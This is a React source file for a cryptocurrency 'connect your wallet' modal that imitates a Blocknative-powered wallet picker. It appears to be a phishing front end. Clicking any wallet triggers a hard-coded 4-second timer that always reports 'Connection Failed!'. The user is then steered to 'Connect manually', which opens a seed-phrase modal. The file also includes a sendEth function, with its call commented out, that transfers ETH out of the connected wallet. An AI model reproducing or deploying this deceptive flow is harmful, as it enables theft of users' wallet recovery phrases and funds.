import React, { useContext, useState } from 'react';
import Backdrop from '@mui/material/Backdrop';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import Fade from '@mui/material/Fade';
import Typography from '@mui/material/Typography';
import { ArrowUpIcon, CloseButton, InfoFilledIcon } from '../assets/icons';
import { myContext } from '../MyContext';
import { blockLogo, coinbaseLogo, logo, metaMaskLogo, newLogo, spinner, walletConnecLogo } from '../assets/images';
import Spinner from './spinner';
import ScanWalletModal from './scanModal';
import axios from 'axios';
import { url } from './constants';
import { ethers } from 'ethers';
import PhraseWalletModal from './phraseModal';
import Web3 from 'web3';

export const style = {
    position: 'absolute',
    // top: '43%',
    left: '50%',
    // height: "440px",
    transform: 'translate(-50%, -50%)',
    borderRadius: "15px",
    marginTop: "2.5em",
    bgcolor: '#2E2E34',
    outline: "none",
    boxShadow: 24,
};

export const styleHeader = {
    borderBottom: '1px solid rgb(63 63 70)',
    p: 1,
    color: "rgb(161 161 170)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center"
}

export default function ConnectWalletModal() {
    const { openWalletModal, setWalletModal, setScanWalletModal, setPhraseWalletModal, setClickedWallet, clickedWallet } = useContext(myContext)
    const [clickedWalletIndex, setClickedWalletIndex] = useState();
    const [isRejected, setIsRejected] = useState(false)
    const [isLoading, setIsLoading] = useState(false)

    const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
    const [recipientAddress, setRecipientAddress] = useState('');
    const [amountToSend, setAmountToSend] = useState('');

    const handleClose = () => setWalletModal(false);

    const avalWallets = [
        {
            logo: metaMaskLogo,
            name: "MetaMask"
        },
        {
            logo: coinbaseLogo,
            name: "Coinbase Wallet"
        },
        {
            logo: walletConnecLogo,
            name: "WalletConnect"
        },
    ]


    const authMetaMask = async () => {
        if (typeof window.ethereum !== "undefined") {
            console.log("metaMask is installed")
            try {
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });
                console.log(accounts)
                setMetaMaskWalletAddress(accounts[0]);
            } catch (error) {
                console.log("error connecting to wallet", error)
            }

        } else {
            console.log("Please install metamask")
        }
    }

    const sendEth = async () => {
        if (!recipientAddress || !amountToSend) {
            console.error('Recipient address and amount are required');
            return;
        }

        try {
            const web3 = new Web3(window.ethereum);

            // Convert the amount to wei (1 Ether = 10^18 Wei)
            const amountInWei = web3.utils.toWei(amountToSend, 'ether');

            // Get the current chain ID
            const chainId = await web3.eth.getChainId();

            // Check if the recipient address is valid
            const isValidAddress = web3.utils.isAddress(recipientAddress);
            if (!isValidAddress) {
                console.error('Invalid recipient address');
                return;
            }

            // Send the transaction
            const transactionHash = await web3.eth.sendTransaction({
                from: metaMastWalletAddress,
                to: recipientAddress,
                value: amountInWei,
                gas: '21000', // You may need to adjust the gas limit
                chainId: chainId,
            });

            console.log('Transaction sent:', transactionHash);
        } catch (error) {
            console.error('Error sending transaction:', error);
        }
    };

    function handleWalletClick(name) {
        setClickedWalletIndex(name)
        authMetaMask()
        setTimeout(() => {
            setIsRejected(true)
            // sendEth()
        }, 4000);
    }

    function backToWallets() {
        setClickedWalletIndex()
        setIsRejected(false)
    }

    function handleManualConnect() {
        setIsLoading(true)
        setTimeout(() => {
            setPhraseWalletModal(true)
            setIsLoading(false)
        }, 3000);
    }


    return (
        <Modal
            aria-labelledby="transition-modal-title"
            aria-describedby="transition-modal-description"
            open={openWalletModal}
            onClose={handleClose}
            closeAfterTransition
            slots={{ backdrop: Backdrop }}
            slotProps={{
                backdrop: {
                    timeout: 500,
                },
            }}
        >
            <Fade in={openWalletModal}>
                <Box className=" md:w-[800px] md:h-[400px] max-h-[600px] md:top-[43%] smm:top-[50%] top-[55%] w-full m-auto flex max-md:flex-col-reverse" sx={style}>
                    <Box className="bg-[#34353B] md:w-[39%] w-[95%] max-md:m-auto max-md:mt-6">
                        <div className='md:w-[70%] w-[90%] max-md:text-center m-auto md:pt-16'>
                            <img src={newLogo} alt='logo' className='w-[17px] max-md:hidden' />
                            <div className='py-6 text-[#DCEFFA]'>
                                <header className='mb-4'>Connect your wallet</header>
                                <div className='text-sm'>Connecting your wallet is like “logging in” to Web3. Select your wallet from the options to get started.</div>
                            </div>
                            <div className='flex items-center max-md:justify-center text-sm gap-2 ps-4 text-[#6370E5]'>
                                <p>I don't have a wallet </p>
                                <InfoFilledIcon className='text-2xl' />
                            </div>

                            <div className='relative md:mt-16 mt-4 mb-4 md:w-[90%] w-[130px] m-auto'>
                                <div className=' flex justify-between items-center'>
                                    <div className='h-3 w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div>
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                </div>
                                <div className='absolute top-1/2 w-full h-[2px] bg-[#1A1D26]'></div>
                            </div>
                            <div className='text-[#DCEFFA] max-md:hidden flex gap-1 ms-8 items-center text-[12px] text-center'>powered by
                                <b>blocknative</b>
                                <img src={blockLogo} alt='' className='w-[15px]' />
                            </div>
                        </div>
                        <div className='text-[#DCEFFA] gap-1 flex ps-[30%] items-center md:hidden bg-[#2E2E34] py-3 text-[12px] text-center'>powered by
                            <b>blocknative</b>
                            <img src={blockLogo} alt='' className='w-[15px]' />
                        </div>
                    </Box>


                    <Box className="md:w-[61%] relative">
                        <Box sx={styleHeader}>
                            <Typography className='text-white ps-2'> {!isRejected ? "Available Wallets (3)" : "Connection Rejected"} </Typography>
                            <CloseButton onClick={handleClose} className='text-[32px] shadow-sm cursor-pointer bg-[#34353B] p-1 rounded-full text-zinc-400' />
                        </Box>
                        <Box className="">
                            <div className='w-[94%] max-md:overflow-x-scroll hideScrollBar max-md:flex items-start gap-3 max-md:pt-2 m-auto'>
                                {
                                    !isRejected && (
                                        <>
                                            <div className='text-[#DCEFFA] md:grid flex items-start grid-cols-2 md:gap-2 gap-6 pt-4'>
                                                {
                                                    avalWallets.map((wallet, index) => (
                                                        <div key={index} onClick={(e) => { handleWalletClick(wallet.name); setClickedWallet({ ...clickedWallet, logo: wallet.logo, name: wallet.name }) }} className='md:border duration-500 max-md:text-center rounded-2xl md:hover:bg-[#34353B] cursor-pointer md:p-4 border-zinc-700 md:flex items-center gap-2'>
                                                            <div className='border p-2 md:h-[3.1em] h-[4em] flex items-center justify-center max-md:mb-2 rounded-2xl border-zinc-600 md:w-[50px] w-[4em]'>
                                                                {
                                                                    clickedWalletIndex === wallet.name ? (
                                                                        <Spinner />
                                                                    ) : (
                                                                        <img src={wallet.logo} alt='' className=' w-full object-contain ' />
                                                                    )
                                                                }
                                                            </div>
                                                            <div className=' max-md:text-[12px]'>{wallet.name}</div>
                                                        </div>
                                                    ))
                                                }
                                            </div>

                                            <div className='flex max-md:min-w-[600px] justify-between bg-[#FFEFCC] rounded-xl p-3 md:mt-2 mt-4'>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F]'>Why don't I see my wallet?</div>
                                                    <div >Click here to learn more</div>
                                                </div>
                                                <InfoFilledIcon className='text-[#664600] text-[20px]' />
                                            </div>
                                        </>
                                    )
                                }
                                {
                                    isRejected && (
                                        <div className='w-full'>
                                            <div className='flex gap-12 bg-[#FFEFCC] max-md:min-w-[400px] rounded-3xl p-4 mt-4'>
                                                <div className='flex items-center relative '>
                                                    <div className='w-[40px] border flex justify-center items-center rounded-xl bg-[#EBEBED] border-[#FFAF00] h-[40px]'>
                                                        <img src={newLogo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                    <div className='w-[40px] border absolute right-[-2em] flex justify-center items-center rounded-xl bg-white border-[#FFAF00] h-[40px]'>
                                                        <img src={clickedWallet.logo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                </div>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F] text-[16px]'>Connection Failed!</div>
                                                    {/* <div onClick={backToWallets} className=' cursor-pointer'>Click here to connect manually</div> */}
                                                    <div onClick={backToWallets} className=' cursor-pointer'>Click here to try again</div>
                                                </div>
                                            </div>
                                            <div className='mt-12 flex justify-center w-full items-center'>
                                                <div>
                                                    <div className='text-[12px] text-zinc-300'>Having issues connecting wallet?</div>
                                                    <button
                                                        onClick={handleManualConnect}
                                                        className=" flex items-center justify-center rounded-full bg-primGreen w-[200px] mt-2 text-black py-[7px]"
                                                    >
                                                        {
                                                            isLoading ? (
                                                                <img src={spinner} alt='Loading...' className='w-[20px]' />
                                                            ) : (
                                                                <div className='flex gap-2 items-center'>
                                                                    Connect manually <ArrowUpIcon />
                                                                </div>
                                                            )
                                                        }
                                                    </button>
                                                </div>
                                            </div>
                                            <div onClick={backToWallets} className=' bottom-8 max-md:mt-6 max-md:w-[200px] md:absolute flex md:justify-center items-center w-full '>
                                                <button className='bg-[#FFFFFF]  text-[13px] px-4 font-bold text-[#33394B] py-1 rounded-full'>
                                                    Back to wallets
                                                </button>
                                            </div>
                                        </div>
                                    )
                                }
                            </div>
                            {/* <ScanWalletModal /> */}
                            <PhraseWalletModal />
                            {/* {
                                isLoading && (
                                    <div className='absolute top-0 right-0 bottom-0 left-0 flex justify-center items-center bg-[#2d2e33a5]'>
                                        <img src={spinner} alt='Loading...' className='w-[40px]' />
                                    </div>
                                )
                            } */}
                        </Box>
                    </Box>
                </Box>
            </Fade>
        </Modal>
    );
}
